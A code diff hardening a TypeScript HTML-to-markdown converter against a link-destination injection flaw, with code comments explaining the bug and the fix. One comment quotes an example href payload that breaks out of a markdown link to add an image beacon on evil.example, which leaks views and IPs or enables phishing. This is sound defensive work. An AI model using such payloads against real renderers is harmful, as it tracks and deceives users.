@@ -76,8 +76,55 @@ function escapeMarkdown(text: string): string {
   return text.replace(/([\\`*_[\]<>])/g, '\\$1')
 }
 
+/**
+ * Maximum length of a link destination we are willing to emit.
+ */
+const MAX_HREF_LENGTH = 2048
+
+/**
+ * Characters that must NEVER appear in a link destination we emit.
+ *
+ * SECURITY-REVIEW ROUND 2, HIGH-1 — this is the check that was too loose.
+ * The previous test was `^https?:\/\/\S+$`, and `\S+` happily accepts `)`.
+ * A DOU vacancy (anyone can post one — the source does not need to be
+ * compromised) carrying
+ *
+ *   <a href="https://ok.example/x)![](https://evil.example/px.png?leak=1">t</a>
+ *
+ * produced the markdown
+ *
+ *   [t](https://ok.example/x)![](https://evil.example/px.png?leak=1)
+ *
+ * — the `)` closed OUR link and the rest became a second, attacker-controlled
+ * markdown IMAGE: a tracking beacon on a foreign host (leaks that the vacancy
+ * was viewed, plus the viewer's IP), or an `[Apply here](https://evil…)`
+ * phishing link. No raw HTML and no `javascript:` anywhere, so neither the old
+ * tests nor the "we don't enable rehype-raw" argument touched it.
+ *
+ * Note this was an injection MANUFACTURED BY THIS FUNCTION: the text was
+ * escaped, the destination was interpolated raw.
+ */
+const FORBIDDEN_HREF_CHARS = /[\s()[\]<>"'`\\\u0000-\u001f\u007f]/
+
 function isSafeLinkTarget(href: string): boolean {
-  return /^https?:\/\/\S+$/i.test(href.trim())
+  const trimmed = href.trim()
+  if (trimmed.length === 0 || trimmed.length > MAX_HREF_LENGTH) return false
+  if (FORBIDDEN_HREF_CHARS.test(trimmed)) return false
+  return /^https?:\/\/[^\s]+$/i.test(trimmed)
+}
+
+/**
+ * Render a validated destination in CommonMark's ANGLE-BRACKET form —
+ * `[text](<https://…>)` — so a stray `)` cannot terminate the destination even
+ * if the character check above were ever loosened again. Combined with that
+ * check (which already rejects `(`, `)`, `<` and `>`), the destination has two
+ * independent reasons it cannot break out of its own parentheses.
+ *
+ * Emitting it by bare string interpolation, with NO such guarantee, is exactly
+ * what produced HIGH-1.
+ */
+function markdownLinkDestination(href: string): string {
+  return `<${href.trim()}>`
 }
 
 interface Token {
@@ -286,9 +333,15 @@ export function htmlToMarkdown(html: string | null | undefined): string {
         if (token.closing) {
           if (linkHref !== null) {
             const text = linkText.trim()
-            // A non-http(s) target is rendered as TEXT, never as a link — this
-            // is what stops `[click](javascript:…)` from reaching the browser.
-            out += isSafeLinkTarget(linkHref) && text.length > 0 ? `[${text}](${linkHref})` : text
+            // A target that is not a plain http(s) URL is rendered as TEXT,
+            // never as a link — this is what stops `[click](javascript:…)`
+            // from reaching the browser, and (HIGH-1) what stops a `)` in the
+            // destination from closing our link and letting the rest of the
+            // attribute become attacker-authored markdown.
+            out +=
+              isSafeLinkTarget(linkHref) && text.length > 0
+                ? `[${text}](${markdownLinkDestination(linkHref)})`
+                : text
             linkHref = null
             linkText = ''
           }
